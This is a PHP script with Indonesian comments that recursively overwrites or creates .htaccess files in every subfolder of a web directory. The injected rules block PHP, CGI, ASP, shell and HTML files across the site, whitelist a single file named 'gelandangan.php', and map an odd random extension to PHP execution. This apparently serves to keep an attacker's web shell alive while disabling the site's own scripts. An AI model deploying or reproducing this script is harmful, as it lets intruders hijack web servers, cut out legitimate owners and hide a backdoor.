<?php
// Isi .htaccess baru
$newHtaccessContent = <<<HT
# .htaccess diganti otomatis
<Files *.ph*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.Ph*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.pH*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.PH*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.sh*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.Sh*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.sH*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.SH*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.AS*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.As*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.aS*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.as*>
    Order Deny,Allow
    Deny from all
</Files>
<FilesMatch ".*\.(cgi|pl|py|pyc|pyo|php3|php4|php6|pcgi|pcgi3|pcgi4|pcgi5|pchi6|inc|php|Php|pHp|phP|PHp|pHP|PhP|PHP|PhP|php5|Php5|phar|PHAR|Phar|PHar|PHAr|pHAR|phAR|inc|phaR|pHp5|phP5|PHp5|pHP5|PhP5|PHP5|cgi|CGI|CGi|cGI|PhP5|php6|php7|php8|php9|phtml|Phtml|pHtml|phTml|pHTml|Fla|fLa|flA|FLa|fLA|FlA|FLA|phtMl|phtmL|PHtml|PhTml|PHTML|PHTml|PHTMl|PhtMl|PHTml|PHtML|pHTMl|PhTML|pHTML|PhtmL|PHTmL|PhtMl|PhtmL|pHtMl|PhTmL|pHtmL|aspx|ASPX|asp|ASP|php.jpg|PHP.JPG|php.xxxjpg|PHP.XXXJPG|php.jpeg|PHP.JPG|PHP.JPEG|PHP.PJEPG|php.pjpeg|php.fla|PHP.FLA|php.png|PHP.PNG|php.gif|PHP.GIF|php.test|php;.jpg|PHP JPG|PHP;.JPG|php;.jpeg|php jpg|php.bak|php.pdf|php.xxxpdf|php.xxxpng|fla|Fla|fLa|fLa|flA|FLa|fLA|FLA|FlA|php.xxxgif|php.xxxpjpeg|php.xxxjpeg|php3.xxxjpeg|php3.xxxjpg|php5.xxxjpg|php3.pjpeg|php5.pjpeg|shtml|php.unknown|php.doc|php.docx|php.pdf|php.ppdf|jpg.PhP|php.txt|php.xxxtxt|PHP.TXT|PHP.XXXTXT|php.xlsx|php.zip|php.xxxzip|php78|php56|php96|php69|php67|php68|php4|shtMl|shtmL|SHtml|ShTml|SHTML|SHTml|SHTMl|ShtMl|SHTml|SHtML|sHTMl|ShTML|sHTML|ShtmL|SHTmL|ShtMl|ShtmL|sHtMl|ShTmL|sHtmL|Shtml|sHtml|shTml|sHTml|shtml|php1|php2|php3|php4|php10|alfa|suspected|py|exe|htm|html|alfa|htaccess)$"> 
Order Allow,Deny
Deny from all
</FilesMatch>
<FilesMatch "\.(jpg|jpeg|png|gif|bmp|ico)$">
    Order Deny,Allow
    Allow from all
</FilesMatch>
<FilesMatch "\.(mp4|avi|mov|wmv|mp3|wav|ogg)$">
    Order Deny,Allow
    Allow from all
</FilesMatch>
<FilesMatch "\.(pdf|doc|docx|xls|xlsx|zip|rar|tar|gz|ppt|pptx|csv|)$">
    Order Deny,Allow
    Allow from all
</FilesMatch>
<FilesMatch "^(gelandangan.php)$">
 Order allow,deny
 Allow from all
</FilesMatch>

AddType Application/x-httpd-php .Akukaddidiidididikgzkss
HT;

// Fungsi rekursif untuk ganti/buat .htaccess di semua subfolder
function gantiHtaccessSemuaFolder($dir, $isiBaru) {
    // Ganti atau buat .htaccess di folder saat ini
    $htaccessFile = $dir . DIRECTORY_SEPARATOR . '.htaccess';
    file_put_contents($htaccessFile, $isiBaru);
    echo "[✔] .htaccess diganti di: $htaccessFile\n";

    // Telusuri isi folder
    $isi = scandir($dir);
    foreach ($isi as $item) {
        if ($item === '.' || $item === '..') continue;

        $fullPath = $dir . DIRECTORY_SEPARATOR . $item;

        if (is_dir($fullPath)) {
            gantiHtaccessSemuaFolder($fullPath, $isiBaru); // Rekursif
        }
    }
}

// Mulai dari direktori tempat script ini berada
$mulaiDari = __DIR__;
gantiHtaccessSemuaFolder($mulaiDari, $newHtaccessContent);

echo "\n✅ Selesai: Semua .htaccess telah diganti/membuat baru dari: $mulaiDari\n";
?>
